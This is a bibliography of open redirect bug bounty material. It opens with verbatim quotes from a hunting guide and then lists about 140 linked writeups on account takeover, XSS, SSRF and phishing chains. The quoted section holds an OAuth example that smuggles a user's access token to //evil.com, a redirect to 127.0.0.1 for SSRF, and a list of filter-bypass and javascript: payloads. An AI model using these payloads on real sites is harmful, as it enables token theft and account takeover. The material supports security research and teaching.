---
title: "Open Redirect blogs index — bibliography: zseano guide (byte-quoted), community writeup corpus (title-linked), skill-cited modern cases"
type: bibliography
built: "2026-10-29"
byte_quoted_sources: 1
title_linked_sources: 136 (bugbountyhunting.com index, deduped from 148) + 6 skill-cited modern cases
body_fetched_blog_sources: 1 failed (zseano.com/blogs/2.html — fetch timed out twice, recorded title-only)
---

# Blogs Index — Open Redirect

Quote rule (vault-wide): byte-true quotes only from sources actually fetched this build.
Everything else is title + link, marked `title-only`. Nothing below was written from memory.

## 1. BugBountyHunter — "Learning about Open Url Redirects" by @zseano (fetched 2026-10-28, byte-true)

URL: `https://www.bugbountyhunter.com/vulnerability/?type=open_redirect`

**The doctrine, verbatim:**

> Typically companies/bug bounty programs consider open redirects as low impact, so this means
> that not only are they easy to find, but if any filtering does exist it is usually relatively
> easy to bypass. It is a good idea to hold onto some open url redirects when hunting as these
> can be used to bypass server side request forgery (SSRF) filters and you can turn your redirect
> into a high impact bug.

**The dorking method, verbatim:**

> To begin with let's start with finding an open url redirect and explore common places to look
> for them. I will always start with dorking since Google knows more about a target than me, so
> let's see what google knows first by using site:example.com inurl: and then playing with the
> following dorks: (and also try come up with your variants, you never know what you will
> discover!)

The 14 dorks, verbatim as bulleted in the guide:

- `"go"`
- `"return"`
- `"r_url"`
- `"returnUrl"`
- `"returnUri"`
- `"locationUrl"`
- `"goTo"`
- `"return_url"`
- `"return_uri"`
- `"ref="`
- `"referrer="`
- `"backUrl"`
- `"returnTo"`
- `"successUrl"`

And the continuation, verbatim:

> None found? Ok no problem, lets start using their site and look at common places. From my
> experience most sites usually redirect the user after some type of action such as logging in,
> logging out, password change, signup. The parameter can usually be found in the URL, or
> sometimes you need to hunt in .js files for referenced parameters. It is highly likely that the
> login page will handle some type of redirect parameter so make sure to look deeply!. Once you
> have discovered one parameter name used for redirecting then typically developers will re-use
> code/parameter names throughout so test this parameter on every endpoint you discover.

**The OAuth token-smuggling lane, verbatim core:**

> Most Oauth setups will whitelist *.theirdomain.com/*, however thank to our open redirect we can send the user to the following: https://www.example.com/oauth?client_id=123&scope=email&response_type=token&return_uri=https://www.example.com/redirect%3Fgoto=//evil.com. In most cases adding response_type=token is important on most oauth web applications as the hash fragment is smuggled in the redirect, and it's usually a working access token. code= typically has to be "exchanged" for an access_token which will happen elsewhere.

Sequence: *The user will authenticate and the token will be generated.* → *The web application
redirects to https://www.example.com/redirect%3Fgoto=//evil.com#access_token=123* → *The web
application redirects to //evil.com#access_token123* — "we used the open redirect to 'smuggle' the
users token to our address".

**Encoding discipline, verbatim:**

> Sometimes your flow may need to redirect twice, so you can try double encoding on the FINAL URL.
> The reason for this is because on first redirection it will be url encoded once, then again on
> the second. If it's already fully url decoded on the first then it may fail.

**SSRF/RCE blacklist bypass, verbatim:**

> Imagine you have an endpoint which takes an ?url= parameter but it will only allow you to input
> local endpoints, such as /example. Now imagine you also have an open redirect at
> /redirect?goto=//127.0.0.1/. Pointing ?url= to this endpoint may cause their web application to
> trust the user input (since it is pointing to local endpoint), but process the redirect & show
> you sensitive information. Remember this is a redirect from their domain which means you have
> level of trust via their domain (think if you need the Referrer header to contain their domain,
> now you can)

**XSS lane, verbatim:**

> If it's a 302 redirect then it will not work, but if they are redirecting via javascript then
> it will work.

*(between them in the guide: the `top.location.href='reflectedhere';` script example — elided)*

> When looking for these types of XSS vulnerabilities (via redirect), always look for strings such
> as window.location, top.location.href, location..

**The bypass list, verbatim as bulleted in the guide (21 entries):**

- `\/yoururl.com`
- `\/\/yoururl.com`
- `\\yoururl.com`
- `//yoururl.com`
- `//[email protected]`
- `/\/yoursite.com`
- `https://yoursite.com%3F.theirsite.com/`
- `https://yoursite.com%2523.theirsite.com/`
- `https://yoursite?c=.theirsite.com/`
- `https://yoursite.com#.theirsite.com/`
- `https://yoursite.com\.thersite.com/`
- `//%2F/yoursite.com`
- `////yoursite.com`
- `https://theirsite.computer/` — followed in the guide by its own note, verbatim: *"This is when .domain.com* is whitelisted and you can use .computer domain!"*
- `https://theirsite.com.mysite.com`
- `/%0D/yoursite.com (Also try %09, %00, %0a, %07)`
- `java%0d%0ascript%0d%0a:alert(0) j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm\`0\``
- `java%07script:prompt\`0\` java%09scrip%07t:prompt\`0\``
- `/%2F/yoururl.com`
- `/%5Cyoururl.com`
- `//google%E3%80%82com` (fullwidth period)

**The zseano tip, verbatim:**

> A lot of developers don't see the harm in an open redirect so usually no filtering exists when
> you discover one. This makes them extremely easy to find and a great start for newcomers. Advance
> your skills by finding a way to chain it for more impact!

**Challenges referenced** (raw form from the guide): `Easy Only relative redirects are allowed!` ·
`Easy You may only redirect to *.bugbountyhunter.com` · `Medium Can you steal the SSO token?`

## 2. Community writeup corpus (bugbountyhunting.com index — title + link only, bodies NOT fetched)

Extracted from the site's writeup index (7,103 entries) with the redirect-class filter: 148 raw → 140 unique (8 duplicate titles) → 136 kept + 4 filter-artifact noise (§2.1). All links below are verbatim from the index; no body was fetched.


**ATO chains (redirect → credentials/tokens)** (20):

- [GitHub Gist - Account takeover via open redirect - $10,000 Bounty](https://devcraft.io/2020/10/19/github-gist-account-takeover.html)
- [Watch your requests! Open redirect to a complete account takeover](https://ninetyn1ne.github.io/2020-10-05-open-redir-to-ato/)
- [CSRF + Open Redirect To Account Takeover](https://www.r29k.com/articles/bb/csrf)
- [DOM based open redirect to the leak of a JWT token](https://medium.com/@adam.adreleve/dom-based-open-redirect-to-the-leak-of-a-jwt-token-1b1dd2ced9a1)
- [From Sub domain Takeover to Open-Redirect](https://medium.com/@aniltom/https-medium-com-aniltom-from-sub-domain-takeover-to-open-redirect-b5be4906e1a4)
- [The Unusual Case of Status code- 301 Redirection to AWS Security Credentials Compromise](https://medium.com/@logicbomb_1/the-unusual-case-of-open-redirection-to-aws-security-credentials-compromise-59acc312f02b)
- [Open-redirect to Account Takeover.](https://medium.com/@__rishabh__/open-redirect-to-account-takeover-e939006a9f24)
- [Hijacking accounts by retrieving JWT tokens via unvalidated redirects](https://www.shawarkhan.com/2019/01/hijacking-accounts-by-retrieving-jwt.html)
- [Full Account Takeover via Referer Header (OAuth token Steal, Open Redirect Vulnerability Chaining)](https://medium.com/@protector47/full-account-takeover-via-referrer-header-oauth-token-steal-open-redirect-vulnerability-chaining-324a14a1567)
- [Chain the vulnerabilities and take your report impact on the moon (CSRF to HTML INJECTION which results OPEN REDIRECT and could steal USER CREDENTIALS)](https://medium.com/@armaanpathan/chain-the-vulnerabilities-and-take-your-report-impact-on-the-moon-csrf-to-html-injection-which-608fa6e74236)
- [Open URL redirects to grab FB OAuth Tokens](https://zseano.com/blogs/2.html)
- [How I could have hacked your Medium account by phishing your FB, Twitter, Google credentials](https://infosecwriteups.com/how-i-could-have-hacked-your-medium-account-by-phishing-your-fb-twitter-google-credentials-d53bf7096da7)
- [[VDP] Open Redirection Bug on LinkedIn Sales Navigator Login Panel](https://altamashbm.medium.com/open-redirection-bug-on-linkedin-sales-navigator-login-panel-9bf686033a55)
- [Never underestimate the power of open redirect, a story of a full account takeover](https://www.bugbounty.info/2022/08/never-underestimate-power-of-open.html)
- [How an Open Redirection Leads to an Account Takeover?](https://infosecwriteups.com/how-an-open-redirection-leads-to-an-account-takeover-73ea883055d1)
- [Full Account Takeover via Open Redirection](https://medium.com/@vflexo/full-account-takeover-via-open-redirection-41c167db46)
- [Chaining Open Redirect with XSS to Account Takeover](https://radianid.medium.com/chaining-open-redirect-with-xss-to-account-takeover-36acf218a6d5)
- [Facebook account takeover due to unsafe redirects after the OAuth flow](https://ysamm.com/?p=667)
- [Password Reset Token Leak via X-Forwarded-Host](https://saajan.bhujel.cyou/blog/web/2021-02-26-password-reset-token-leak-via-x-forwarded-host)
- [How I chained P4 To P2 [Open Redirection To Full Account Takeover]](https://medium.com/bugbountywriteup/how-i-chained-p4-to-p2-open-redirection-to-full-account-takeover-a28b09a94bf7)

**OAuth redirect_uri doctrine** (5):

- [Microsoft ID Open Redirect](https://burninatorsec.blogspot.com/2019/07/microsoft-id-open-redirect.html)
- [OAuth authentication bypass on Airbnb acquisition using 1-char Open Redirect](https://xpoc.pro/oauth-authentication-bypass-on-airbnb-acquisition-using-weird-1-char-open-redirect/)
- [OAuth 2.0 Redirect URI Validation Falls Short, Literally](https://innotommy.com/Wrong_redirect_uri_validation_in_OAuth-4.pdf)
- [Insufficient Redirect URI validation: The risk of allowing to dynamically add arbitrary query parameters and fragments to the redirect_uri](https://security.lauritz-holtmann.de/post/sso-security-redirect-uri-ii/)
- [Exploiting Open Redirect - Whitelist Bypass Using Salesforce Environment](https://payatu.com/blog/gaurav/exploiting-open-redirect)

**XSS chains** (20):

- [[Still work] Redirect Yahoo Subdomain XSS Reflected from americangreetings.com](https://www.mohamedharon.com/2019/02/still-work-redirect-yahoo-subdomain-xss.html)
- [Persistent XSS (unvalidated Open Graph embed) at LinkedIn.com](https://medium.com/@jonathanbouman/persistent-xss-unvalidated-open-graph-embed-at-linkedin-com-db6188acedd9)
- [Persistent XSS (Unvalidated oEmbed) at Medium.com](https://medium.com/@jonathanbouman/stored-xss-unvalidated-embed-at-medium-com-528b0d6d4982)
- [Reflective XSS and Open Redirect on Indeed.com subdomain](https://medium.com/@SyntaxError4/reflective-xss-and-open-redirect-on-indeed-com-subdomain-b4ab40e40c83)
- [Godaddy XSS affects parked domains redirector/processor!](https://www.seekurity.com/blog/write-ups/godaddy-xss-affects-parked-domains-redirector-processor/)
- [URL Redirection To DOM XSS on Hackerone Programs — Bug Bounty Tuesday](https://medium.com/@kerstan/dom-xss-on-hackerone-programs-bug-bounty-tuesday-8973ecf6af95)
- [Discovering 7 Open Redirect Bypasses and 3 XSS Bypasses Within a Single Program Using the Same Parameters](https://0xm5awy.medium.com/discovering-7-open-redirect-bypasses-and-3-xss-bypasses-within-a-single-program-using-same-8e87581e1a75)
- [Reflected XSS Injection & Permanent Open Redirection](https://medium.com/@0day_exploit/stored-xss-injection-permanent-open-redirection-e14ffa11573c)
- [Exploit an unexploitable XSS via an open redirect — A Real-Life Scenario from a Hacker’s Mindset](https://medium.com/@ajzead660/exploit-an-unexploitable-xss-via-an-open-redirect-a-real-life-scenario-from-a-hackers-mindset-32b71041c5fe)
- [Stored Iframe Injection & Permanent Open Redirection - Zero Day](https://shahjerry33.medium.com/stored-iframe-injection-permanent-open-redirection-zero-day-ce7cd15903ac)
- [Mr. Robot: Self Xss from Informative to high 1200$ ,csrf, open redirect,self xss to stored](https://ahmadaabdulla.medium.com/mr-robot-self-xss-from-informative-to-high-1200-csrf-open-redirect-self-xss-to-stored-92f371ba3da1)
- [Escalating Open Redirect to XSS](https://sagarsajeev.medium.com/escalating-open-redirect-to-xss-d2b9355e5f05)
- [From Open Redirect to Reflected XSS manually](https://medium.com/@rodricbr/from-open-redirect-to-reflected-xss-manually-64e633a3d23f)
- [A Tale of Open Redirection to Stored XSS](https://medium.com/@tushar.tilak.sharma/a-tale-of-open-redirection-to-stored-xss-6ad426ae9d43)
- [XSS via X-Forwarded-Host header](https://medium.com/@abhijeetbiswas_/xss-cross-site-scripting-via-x-forwarded-host-header-20be114d4254)
- [1st Bug Bounty WriteUp: Open Redirect To XSS on Login Page](https://nassimchami.medium.com/1st-bug-bounty-writeup-open-redirect-to-xss-on-login-page-313221da2879)
- [eBay XSS demo and guide to spear phishing](https://0x80dotblog.wordpress.com/2021/07/24/ebay-xss-demo-and-guide-to-spear-phishing/)
- [Forcing Firefox to Execute XSS Payloads during 302 Redirects](https://www.gremwell.com/firefox-xss-302)
- [CVE-2019-18426 - WhatsApp Vulnerabilities Disclosure - Open Redirect + CSP Bypass + Persistent XSS + FS read permissions + potential for RCE](https://weizman.github.io/2020/02/14/whatsapp-vuln/)
- [How i was able to exploit the same endpoint 2 times ( multiple xss & open Redirection on 10 subdomain)](https://medium.com/@ratnadip1998/how-i-was-able-to-exploit-the-same-endpoint-2-times-multiple-xss-open-redirection-on-10-5d12886f823d)

**SSRF / RCE chains** (10):

- [Open Sesame: Escalating Open Redirect to RCE with Electron Code Review](https://spaceraccoon.dev/open-sesame-escalating-open-redirect-to-rce-with-electron-code-review?pk_campaign=rss-feed)
- [Crowdsource Success Story: From an Out-of-Scope Open Redirect to CVE-2020-1323](https://blog.detectify.com/2020/08/14/crowdsource-success-story-from-an-out-of-scope-open-redirect-to-cve-2020-1323/)
- [Vulnerability in Hangouts Chat: from open redirect to code execution](https://medium.com/@vulnerabilitylabs/vulnerability-in-hangouts-chat-9621100660a0)
- [Airbnb – Chaining Third-Party Open Redirect into Server-Side Request Forgery (SSRF) via LivePerson Chat](https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/)
- [“PhishForce” — Vulnerability Uncovered in Salesforce’s Email Services Exploited for Phishing Facebook Accounts In-The-Wild](https://labs.guard.io/phishforce-vulnerability-uncovered-in-salesforces-email-services-exploited-for-phishing-32024ad4b5fa)
- [SSRF Cross Protocol Redirect Bypass](https://blog.doyensec.com/2023/03/16/ssrf-remediation-bypass.html)
- [A Deep Dive of CVE-2022–33987 (Got allows a redirect to a UNIX socket)](https://itnext.io/a-deep-dive-of-cve-2022-33987-got-allows-a-redirect-to-a-unix-socket-cdeed53944f7)
- [From open redirect to RCE in one week](https://medium.com/@byq/from-open-redirect-to-rce-in-one-week-66a7f73fd082)
- [Multiple HTTP Redirects to Bypass SSRF Protections](https://infosecwriteups.com/multiple-http-redirects-to-bypass-ssrf-protections-45c894e5d41c)
- [AWS internal metadata accessed through SSRF by Chaining an Open Redirect bug](https://notifybugme.medium.com/aws-internal-metadata-accessed-through-ssrf-by-chaining-an-open-redirect-bug-c4b0e4838dc)

**Validation/filter bypasses** (16):

- [Bypassing the Redirect filters with 7 ways](https://elmahdi.tistory.com/m/4)
- [Evading Filters to perform the Arbitrary URL Redirection Attack](https://medium.com/bugbountywriteup/evading-filters-to-perform-the-arbitrary-url-redirection-attack-cce628b9b6a0)
- [How I Bypassed open redirect and i have get reward from yandex](https://medium.com/@minometidji/how-i-bypassed-open-redirect-and-i-have-get-reward-from-yandex-5df5de836718)
- [A Tricky Open Redirect](https://www.hackerinside.me/2019/01/a-tricky-open-redirect.html)
- [Three Cases, Three Open Redirect Bypasses](https://medium.com/@malcolmx0x/three-cases-three-open-redirect-bypasses-887bda60b38c)
- [How I bypassed Ebay process on redirect](https://medium.com/@flex0geek/how-i-bypassed-ebay-process-on-redirect-98739384b4bc)
- [#BugBounty @ Linkedln-How I was able to bypass Open Redirection Protection](https://medium.com/bugbountywriteup/bugbounty-linkedln-how-i-was-able-to-bypass-open-redirection-protection-2e143eb36941)
- [Story of bypassing Referer Header to make open redirect](https://medium.com/@malcolmx0x/story-of-bypassing-referer-header-to-make-open-redirect-94f938b9d032)
- [Amazon Bypass Open Redirect](https://medium.com/@honcbb/amazon-bypass-open-redirect-12609c879dff)
- [The Old, The New and The Bypass - One-click/Open-redirect to own Samsung S22 at Pwn2Own 2022](https://starlabs.sg/blog/2023/06-the-old-the-new-and-the-bypass-one-clickopen-redirect-to-own-samsung-s22-at-pwn2own-2022/)
- [Bypassing open redirect protection site-wide on web2py applications](https://web.archive.org/web/20230515045300/https://www.kaytaq.com/uncategorized/bypassing-open-redirect-protection-site-wide-on-web2py-applications/)
- [Bypassing Safe-Redirect in Rails 7.0](https://bountyplz.xyz/bugbounty/2023/03/03/Bypassing-Safe-Redirect-in-Rails-7.0.html)
- [Bypass Apple’s redirection process with the dot (“.”) character](https://infosecwriteups.com/bypass-apples-redirection-process-with-the-dot-character-c47d40537202)
- [Simple Open Redirect Bypass.](http://blog.h4rsh4d.com/2022/08/open-redirect-bypass.html)
- [How i was able to bypass Open Redirect 3 times on same program.](https://hunter-55.medium.com/how-i-was-able-to-bypass-open-redirect-3-times-on-same-program-d78f9d2443f6)
- [The Bug That Kept On Giving :: PaymentBypass :: Eposed Return Url](https://crypt0g30rgy.github.io/post/PaymentBypassThree)

**Email & phishing infrastructure** (18):

- [Smear phishing: a new Android vulnerability](https://jameshfisher.com/2020/08/06/smear-phishing-how-to-scam-an-android-user/)
- [Harvesting all private invites using leave program fast-tracked invitation and security@ email forwarding feature](https://medium.com/japzdivino/harvesting-all-private-invites-using-leave-program-fast-tracked-invitation-and-security-email-a01c8b3ce76f)
- [IDOR, Content Spoofing and Url Redirection via unsubscribe email in Confluent](https://medium.com/@justmorpheus/idor-content-spoofing-and-url-redirection-via-unsubscribe-email-in-confluent-1fa7398cfe7a)
- [How I could have launched a spear phishing campaign with Starbucks email servers](https://b3nac.github.io/bugs/2018/09/01/How-I-could-have-launched-a-spear-phishing-campaign-with-Starbucks-newsletter-signup.html)
- [Sending out phishing e-mails from @microsoft.com](https://medium.com/bugbountywriteup/sending-out-phishing-e-mails-from-microsoft-com-84c3b918ada2)
- [Phishing with history.back() open redirect](https://medium.com/@0xHyde/exploiting-history-back-3ec789c124dd)
- [Malicious redirect on mailroom.prezi.com](https://blog.it-securityguard.com/bugbounty-malicious-redirect-on-mailroom-prezi-com/)
- [Exploring Anti-Phishing Measures in Microsoft 365](https://certitude.consulting/blog/en/o365-anti-phishing-measures/)
- [Device Code Phishing – Add Your Own Sign-In Methods on Entra ID](https://blog.compass-security.com/2024/01/device-code-phishing-add-your-own-sign-in-methods-on-entra-id/)
- [Phishing the anti-phishers: Exploiting anti-phishing tools for internal access](https://ophionsecurity.com/blog/phishing-the-anti-phishers)
- [Hacking Smartwatches for Spear Phishing](https://cybervelia.com/?p=1380)
- [How a macOS bug could have allowed for a serious phishing attack against users](https://rambo.codes/posts/2022-03-15-how-a-macos-bug-could-have-allowed-for-a-serious-phishing-attack-against-users)
- [Open Redirect via Sendgrid Email Misconfiguration](https://medium.com/@rifqihz/open-redirect-via-sendgrid-email-misconfiguration-cec4ccb07f9a)
- [A phishing document signed by Microsoft – part 2](https://outflank.nl/blog/2022/01/07/a-phishing-document-signed-by-microsoft-part-2/)
- [Don’t Reply: A Clever Phishing Method In Apple’s Mail App](https://jonbottarini.com/2021/12/09/dont-reply-a-clever-phishing-method-in-apples-mail-app/)
- [A phishing document signed by Microsoft – part 1](https://outflank.nl/blog/2021/12/09/a-phishing-document-signed-by-microsoft/)
- [From URL dumps digging to IDOR , BAC, Massive Phishing in Udemy](https://hector0x.medium.com/from-url-dumps-digging-to-idor-bac-massive-phishing-in-udemy-6fa7f94ef256)
- [Open-redirect [in email]](https://inakcf.medium.com/open-redirect-in-email-c658c248eec1)

**Redirect-target & platform cases** (2):

- [Business ID leak via Creative Hub redirect](https://philippeharewood.com/business-id-leak-via-creative-hub-redirect/)
- [How I find Open-Redirect Vulnerability in redacted.com (One of the top online payment processing service website)](https://medium.com/@protector47/how-i-find-open-redirect-vulnerability-in-redacted-com-one-of-the-top-payment-gateway-e9b92afdc114)

**Classic finds / first-bug stories / program coverage** (45):

- [How Redirects work on Facebook? Technical breakdown](https://abhisek3122.medium.com/how-redirects-work-on-facebook-technical-breakdown-6699de52996c)
- [1000$ for Open redirect via unknown technique [BugBounty writeup]](https://ruvlol.medium.com/1000-for-open-redirect-via-unknown-technique-675f5815e38a)
- [How I made $2000 with URL REDIRECTION?](https://medium.com/@singh.simran7838/how-i-made-2000-with-url-redirection-b1b5f4e7a678)
- [An unreproducable bug due to the load balancer, an unusual Open Redirect bug](https://tolo7010note.blogspot.com/2020/07/an-unreproducable-bug-due-to-load.html)
- [Bug Bounty Experience: Unvalidated Redirection Vulnerability](https://medium.com/@letssimplysecure/bug-bounty-experience-unvalidated-redirection-vulnerability-eed40d91da27)
- [How i got 200$ with an out of the box open redirect vulnerability](https://medium.com/@tarek.tix/how-i-got-200-with-an-out-of-the-box-open-redirect-vulnerability-809e91270)
- [Weak Cryptography Leads To Open Redirect](https://medium.com/bugbountywriteup/weak-cryptography-leads-to-open-redirect-3fe052c12995)
- [Strange Redirect (Fixed but no bounty)](https://medium.com/@abhishake100/strange-redirect-fixed-but-no-bounty-54425aea7f19)
- [1st Bug Bounty Write-Up — Open Redirect Vulnerability on Login Page](https://medium.com/@nnez/1st-bug-bounty-write-up-open-redirect-vulnerability-on-login-page-5e0dd9a6eb69)
- [SQL Injection Via Stopping the redirection to a login page](https://medium.com/@St00rm/sql-injection-via-stopping-the-redirection-to-a-login-page-52b0792d5592)
- [Open-redirect Vulnerability on Facebook](https://medium.com/@dwi.siswanto98/open-redirect-on-facebook-bypass-linkshim-4050f680d45c)
- [From POST to GET Open redirect](https://medium.com/sourav-sahana/from-post-to-get-open-redirect-e91f4f4206a)
- [OnePlus Open/Unvalidated Redirects & Forwards](https://medium.com/@tech96bot/oneplus-open-unvalidated-redirects-forwards-234185215f33)
- [Open Redirect in SLACK](https://medium.com/@abaykandotcom/open-redirect-in-slack-385eb34b7c5f)
- [[Open redirect] Developers are lazy(or maybe busy)](https://medium.com/bugbountywriteup/open-redirect-developers-are-lazy-or-maybe-busy-6c51718b10e4)
- [Microsoft BingPlaces Business - (url) Redirect Vulnerability](https://www.vulnerability-db.com/?q=articles/2018/11/16/microsoft-bingplaces-business-url-redirect-vulnerability)
- [Facebook hidden redirection vulnerability](https://medium.com/@egeken/facebook-hidden-redirection-vulnerability-aeaaac0b9d73)
- [Open-Redirect Vulnerability in udacity.com](https://medium.com/@aniltom/open-redirect-vulnerability-in-udacity-com-7cba7abcfd48)
- [Open Redirection](https://medium.com/@ninzatester/open-redirection-afe6c1a64484)
- [Vulnerability in Hangouts Chat a.k.a. how Electron makes open redirect great again](https://blog.bentkowski.info/2018/07/vulnerability-in-hangouts-chat-aka-how.html)
- [Unvalidated Open Redirect Bol.com](https://medium.com/@jonathanbouman/unvalidated-open-redirect-bol-com-b270151380e6)
- [Transforming a Domain into the Matrix (an open redirect story)](https://medium.com/bugbountywriteup/transforming-a-domain-into-the-matrix-an-open-redirect-story-4bd87c3a8caa)
- [Open redirect in informatica (BugBounty)](https://medium.com/@vulnerables/open-redirect-in-informatica-bugbounty-753cf78b2a68)
- [Open Redirect In Flock | My First Swag pack](https://bugbaba.blogspot.com/2017/07/open-redirect-in-flock-my-first-swag.html)
- [Open Redirect Scanner with Uber.com](https://medium.com/bugbountywriteup/open-redirect-scanner-c72cd60d0bf)
- [Open Redirect in Linkedin and Yahoo](https://medium.com/@r0t1v/open-redirect-in-linkedin-and-yahoo-a3ffd2a9cc48)
- [Google.com – Mobile Feedback URL Redirect Regex/Validation Flaw](https://buer.haus/2015/02/03/google-com-mobile-feedback-url-redirect-regexvalidation-flaw/)
- [How I discovered a 1000$ open redirect in Facebook](http://yassineaboukir.com/blog/how-i-discovered-a-1000-open-redirect-in-facebook/)
- [Multiple Open URL Redirection Vulnerability in Facebook Worth $1500](https://arulkumar.in/multiple-open-url-redirection-vulnerability-in-facebook-worth-1500/)
- [Story of a 1000$ Open Redirect](https://infosecwriteups.com/story-of-a-1000-open-redirect-1405fb8a0e7a)
- [NCIIPC VDP Bug : Open Redirection Vulnerability In Govt. Site !!](https://medium.com/@p.ra.dee.p_0xx01/nciipc-vdp-bug-open-redirection-vulnerability-in-govt-site-b048860f5d2d)
- [My First Bug, Open redirect at Epic Games → $500 Bounty](https://medium.com/@bughuntar/my-first-bug-open-redirect-at-epic-games-500-bounty-d0c03de60fa7)
- [Open Redirect at Nvidia](https://xthemo.medium.com/open-redirect-at-nvidia-62343b45f85b)
- [CVE-2022-31813: Forwarding Addresses Is Hard](https://www.synacktiv.com/publications/cve-2022-31813-forwarding-addresses-is-hard.html)
- [How I find open redirect in Facebook](https://medium.com/@abhinavsecondary/how-i-find-open-redirect-in-facebook-7e7aeb89535d)
- [How I found Open redirect on Bug crowd public program in 2 day](https://medium.com/@ittipatjitrada_72022/how-i-found-open-redirect-on-bug-crowd-public-program-in-2-day-a217cfb70f3)
- [A swag for a Open Redirect — Google Dork — Bug Bounty](https://infosecwriteups.com/a-swag-for-a-open-redirect-google-dork-bug-bounty-2143b943f34e)
- [Open Redirection into Bentley System](https://amit-lt.medium.com/open-redirection-into-bentley-system-d1ee188bfb25)
- [Open Redirection - QR Code Magic](https://shahjerry33.medium.com/open-redirection-qr-code-magic-18ace1a0170f)
- [Open Redirect Vulnerability On Zapier: An Accidental Find](https://monish-basaniwal.medium.com/open-redirect-vulnerability-on-zapier-an-accidental-find-4cbbf029956c)
- [How I got $500 with Open redirect](https://medium.com/@mamunwhh/how-i-got-500-with-open-redirect-48fd80c82631)
- [How I found Open Redirect on Hashnode.com](https://gonzx.medium.com/how-i-found-open-redirect-on-hashnode-com-5f3e9ecb8dc6)
- [Open redirect in Instagram.com](https://ysamm.com/?p=625)
- [Open Redirect vulnerability found using link parameter](https://muhammad-aamir.medium.com/open-redirect-vulnerability-found-using-link-parameter-5fc43e2ea8fd)
- [Youtube - Open redirection](https://quitten.github.io/Youtube/)

### 2.1 Filter-artifact rows (caught by arms, not redirect-class — filter honesty)

- [Insertion Of Malicious Links For Execution In Profile Picture - Unvalidated User Input In MS Sharepoint 2019 (CVE-2020-1456)](https://slashcrypto.org/2021/01/15/CVE-2020-1456/)
- [Genie Aladdin Connect Retrofit Garage Door Opener: Multiple Vulnerabilities](https://www.rapid7.com/blog/post/2024/01/03/genie-aladdin-connect-retrofit-garage-door-opener-multiple-vulnerabilities/)
- [CVE-2023-38408: Remote Code Execution in OpenSSH’s forwarded ssh-agent](https://blog.qualys.com/vulnerabilities-threat-research/2023/07/19/cve-2023-38408-remote-code-execution-in-opensshs-forwarded-ssh-agent)
- [X Forwarded for SQL injection](https://outpost24.com/blog/X-forwarded-for-SQL-injection)


## 3. Skill-cited modern cases (hunt-open-redirect doctrine — title-only this build)

The hunt-open-redirect skill's chain doctrine, cross-referenced to entries extracted above
(verbatim links from §2):

1. **GitHub Gist ATO via open redirect — $10,000** — [devcraft.io](https://devcraft.io/2020/10/19/github-gist-account-takeover.html) — the class's modern ceiling for the redirect→ATO chain.
2. **Open Sesame — Electron RCE from open redirect** — [spaceraccoon.dev](https://spaceraccoon.dev/open-sesame-escalating-open-redirect-to-rce-with-electron-code-review?pk_campaign=rss-feed) — code-review-driven chain (the index carries it twice; deduped).
3. **OAuth 2.0 Redirect URI Validation Falls Short, Literally** — §2 OAuth section (extract link: innotommy.com/Wrong_redirect_uri_validation_in_OAuth-4.pdf).
4. **Airbnb acquisition OAuth bypass via 1-char open redirect** — §2 OAuth section (extract link: xpoc.pro entry).
5. **CVE-2022-33987 (Got, redirect to UNIX socket)** — §2 SSRF/RCE section — server-side redirect following turns an open redirect into local socket access.
6. **Rails 7.0 Safe-Redirect bypass** — §2 bypass section — framework safe defaults defeated by shape.

Skill chain table (from the skill): open redirect → OAuth redirect_uri bypass = auth code theft → ATO; → phishing with target domain = social engineering; → server-side followed redirect = SSRF; → logout redirect = session fixation. Severity: alone Low; OAuth/ATO chain High/Critical; SSRF chain High.

Note on case 3/4: the exact links are reproduced in §2's OAuth section as extracted; entries above are the skill's cited doctrine mapped onto the corpus.

